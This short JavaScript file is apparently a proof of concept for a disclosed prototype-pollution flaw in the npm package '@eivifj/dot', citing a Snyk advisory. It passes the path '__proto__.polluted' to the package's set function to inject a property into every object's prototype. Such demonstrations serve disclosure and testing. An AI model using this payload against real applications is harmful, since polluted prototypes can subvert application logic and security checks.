//https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
 
  const a = require("@eivifj/dot");
  const path = "__proto__.polluted";

   

  a.set({}, path, "yes");
// End of file
